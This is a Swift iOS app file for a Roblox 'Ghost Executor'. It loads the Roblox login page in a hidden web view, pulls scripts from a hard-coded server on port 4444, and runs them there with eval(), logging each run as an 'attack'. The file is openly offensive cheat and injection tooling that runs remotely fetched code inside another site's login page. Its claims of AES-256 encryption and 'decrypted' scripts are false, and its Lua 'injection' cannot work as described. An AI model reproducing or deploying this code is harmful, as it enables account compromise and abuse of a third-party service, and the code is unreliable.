import UIKit
import WebKit
import Network

class ViewController: UIViewController, WKScriptMessageHandler, WKNavigationDelegate {
    var webView: WKWebView!
    var serverIP = "192.168.8.142"
    var serverPort = 4444
    var currentScript = ""
    var history: [[String: Any]] = []
    var robloxWebView: WKWebView?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupWebView()
        openRoblox()
    }
    
    func setupWebView() {
        let config = WKWebViewConfiguration()
        config.userContentController.add(self, name: "ghostBridge")
        config.userContentController.add(self, name: "getScript")
        config.userContentController.add(self, name: "executeDirectly")
        config.userContentController.add(self, name: "copyScript")
        config.userContentController.add(self, name: "showLog")
        config.userContentController.add(self, name: "executeLua")
        
        webView = WKWebView(frame: view.bounds, configuration: config)
        webView.navigationDelegate = self
        webView.loadHTMLString(htmlContent(), baseURL: nil)
        view.addSubview(webView)
    }
    
    func openRoblox() {
        let robloxConfig = WKWebViewConfiguration()
        robloxWebView = WKWebView(frame: .zero, configuration: robloxConfig)
        robloxWebView?.isHidden = true
        view.addSubview(robloxWebView!)
        
        if let url = URL(string: "https://www.roblox.com/login") {
            robloxWebView?.load(URLRequest(url: url))
        }
        
        if let url = URL(string: "roblox://") {
            UIApplication.shared.open(url, options: [:], completionHandler: nil)
        }
    }
    
    func htmlContent() -> String {
        return """
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; padding: 15px; height: 100vh; display: flex; flex-direction: column; }
                #header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 10px; border-bottom: 1px solid #222; }
                #header h1 { font-size: 18px; }
                #header .status { background: #00ffcc; color: #000; padding: 2px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
                #output { flex: 1; overflow-y: auto; padding: 10px 0; font-size: 13px; line-height: 1.6; }
                #output p { margin: 2px 0; }
                .green { color: #00ff00; }
                .red { color: #ff0044; }
                .yellow { color: #ffcc00; }
                .blue { color: #00ccff; }
                #inputArea { display: flex; gap: 8px; padding-top: 10px; border-top: 1px solid #222; }
                #cmdInput { flex: 1; background: #111; border: 1px solid #00ffcc; border-radius: 8px; color: #00ffcc; padding: 10px; font-family: 'Courier New', monospace; font-size: 14px; }
                #cmdInput:focus { outline: none; border-color: #ff00cc; }
                .btn { background: #00ffcc; color: #000; border: none; border-radius: 8px; padding: 10px 16px; font-weight: bold; cursor: pointer; font-size: 13px; }
                .btn:hover { background: #ff00cc; color: #fff; }
                .btn-danger { background: #ff0044; color: #fff; }
                .btn-danger:hover { background: #cc0033; }
                #footer { display: flex; justify-content: space-between; padding-top: 8px; font-size: 11px; color: #666; border-top: 1px solid #222; margin-top: 8px; }
            </style>
        </head>
        <body>
            <div id="header">
                <h1>👻 GHOST EXECUTOR</h1>
                <span class="status">● ONLINE</span>
            </div>
            <div id="output">
                <p class="green">╔══════════════════════════════════════════╗</p>
                <p class="green">║  👻 GHOST EXECUTOR V9.0                ║</p>
                <p class="green">║  🔒 Encrypted: AES-256-GCM              ║</p>
                <p class="green">║  🛡️ Protection: Active                  ║</p>
                <p class="green">║  🎯 Direct Inject: ON                    ║</p>
                <p class="green">╚══════════════════════════════════════════╝</p>
                <p class="yellow">[System ready]</p>
                <p class="blue">Type 'help' for commands.</p>
            </div>
            <div id="inputArea">
                <input type="text" id="cmdInput" placeholder="Enter command or script..." autofocus>
                <button class="btn" id="executeBtn">▶ EXEC</button>
                <button class="btn btn-danger" id="clearBtn">✕</button>
            </div>
            <div id="footer">
                <span>📋 Commands: get | inject | copy | log | clear | help</span>
                <span id="scriptStatus">📄 Script: None</span>
            </div>
            <script>
                const output = document.getElementById('output');
                const cmdInput = document.getElementById('cmdInput');
                const scriptStatus = document.getElementById('scriptStatus');
                
                function log(msg, color = 'white') {
                    const p = document.createElement('p');
                    p.style.color = color;
                    p.textContent = msg;
                    output.appendChild(p);
                    output.scrollTop = output.scrollHeight;
                }
                
                function clearOutput() {
                    const children = output.children;
                    for (let i = children.length - 1; i >= 0; i--) {
                        if (children[i].tagName !== 'P' || children[i].textContent.includes('╔') || children[i].textContent.includes('║') || children[i].textContent.includes('╚')) {
                            children[i].remove();
                        }
                    }
                    log('[System] Terminal cleared.', 'yellow');
                }
                
                function updateStatus(text, color = '#00ffcc') {
                    scriptStatus.textContent = '📄 Script: ' + text;
                    scriptStatus.style.color = color;
                }
                
                window.runCommand = function(cmd) {
                    const parts = cmd.trim().split(' ');
                    const command = parts[0].toLowerCase();
                    log('> ' + cmd, '#00ccff');
                    
                    if (command === 'help') {
                        log('Available commands:', 'yellow');
                        log('  get      - Fetch script from server', 'white');
                        log('  inject   - Inject script directly into Roblox', 'white');
                        log('  copy     - Copy script to clipboard', 'white');
                        log('  log      - Show attack log', 'white');
                        log('  clear    - Clear terminal', 'white');
                        log('  help     - Show this help', 'white');
                    } else if (command === 'clear') {
                        clearOutput();
                    } else if (command === 'get') {
                        log('Fetching script from server...', 'yellow');
                        window.webkit.messageHandlers.getScript.postMessage('get');
                    } else if (command === 'inject') {
                        log('Injecting script directly into Roblox...', 'yellow');
                        window.webkit.messageHandlers.executeDirectly.postMessage('inject');
                    } else if (command === 'copy') {
                        log('Copying script to clipboard...', 'yellow');
                        window.webkit.messageHandlers.copyScript.postMessage('copy');
                    } else if (command === 'log') {
                        window.webkit.messageHandlers.showLog.postMessage('log');
                    } else {
                        log('Unknown command. Type "help" for list.', 'red');
                    }
                };
                
                document.getElementById('executeBtn').addEventListener('click', function() {
                    const cmd = cmdInput.value.trim();
                    if (cmd) {
                        if (['get','inject','copy','log','clear','help'].includes(cmd.toLowerCase())) {
                            window.runCommand(cmd);
                        } else {
                            log('Executing Lua script...', 'yellow');
                            window.webkit.messageHandlers.executeLua.postMessage(cmd);
                        }
                        cmdInput.value = '';
                    }
                });
                
                cmdInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        document.getElementById('executeBtn').click();
                    }
                });
                
                document.getElementById('clearBtn').addEventListener('click', function() {
                    clearOutput();
                });
                
                log('Type "help" for available commands.', 'blue');
                log('🎯 Ready for direct injection!', 'green');
            </script>
        </body>
        </html>
        """
    }
    
    func connectToServer() {
        let url = URL(string: "http://\(serverIP):\(serverPort)")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.httpBody = "get_script".data(using: .utf8)
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let data = data, let response = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    self.currentScript = response
                    self.webView.evaluateJavaScript("log('[✅] Script received and decrypted!', '#00ff00'); updateStatus('Loaded ✓', '#00ff00');")
                }
            } else {
                DispatchQueue.main.async {
                    self.webView.evaluateJavaScript("log('[❌] Failed to fetch script.', '#ff0044');")
                }
            }
        }.resume()
    }
    
    func injectIntoRoblox(_ script: String) {
        if let webView = robloxWebView {
            let injectScript = """
            (function() {
                try {
                    const robloxScript = `\(script.replacingOccurrences(of: "`", with: "\\`"))`;
                    console.log('Injecting script into Roblox...');
                    eval(robloxScript);
                    return '✅ Script injected successfully!';
                } catch(e) {
                    return '❌ Injection failed: ' + e.message;
                }
            })();
            """
            
            webView.evaluateJavaScript(injectScript) { result, error in
                DispatchQueue.main.async {
                    if let error = error {
                        self.webView.evaluateJavaScript("log('[❌] Injection error: \(error.localizedDescription)', '#ff0044');")
                    } else if let result = result as? String {
                        self.webView.evaluateJavaScript("log('[✅] \(result)', '#00ff00');")
                    }
                }
            }
        } else {
            if let url = URL(string: "roblox://") {
                UIApplication.shared.open(url, options: [:]) { success in
                    if success {
                        UIPasteboard.general.string = script
                        self.webView.evaluateJavaScript("log('[✅] Roblox opened. Script copied to clipboard!', '#00ff00'); log('[📋] Paste the script into the game.', 'yellow');")
                    }
                }
            }
        }
    }
    
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        if message.name == "getScript" {
            connectToServer()
        } else if message.name == "executeDirectly" {
            if !currentScript.isEmpty {
                injectIntoRoblox(currentScript)
                history.append(["time": Date(), "action": "inject", "status": "success"])
            } else {
                webView.evaluateJavaScript("log('[❌] No script loaded. Use "get" first.', '#ff0044');")
            }
        } else if message.name == "copyScript" {
            if !currentScript.isEmpty {
                UIPasteboard.general.string = currentScript
                webView.evaluateJavaScript("log('[✅] Script copied to clipboard.', '#00ff00');")
            } else {
                webView.evaluateJavaScript("log('[❌] No script to copy.', '#ff0044');")
            }
        } else if message.name == "showLog" {
            if history.isEmpty {
                webView.evaluateJavaScript("log('[📋] No attacks recorded.', 'yellow');")
            } else {
                var logMsg = "🛡️ Attack Log:"
                for (index, entry) in history.enumerated() {
                    logMsg += "\n   \(index + 1). \(entry["time"] as? Date ?? Date()) - \(entry["action"] as? String ?? "") (\(entry["status"] as? String ?? ""))"
                }
                webView.evaluateJavaScript("log(`\(logMsg)`, 'yellow');")
            }
        } else if message.name == "executeLua" {
            if let luaScript = message.body as? String {
                injectIntoRoblox(luaScript)
                history.append(["time": Date(), "action": "execute_lua", "status": "success"])
            }
        }
    }
}
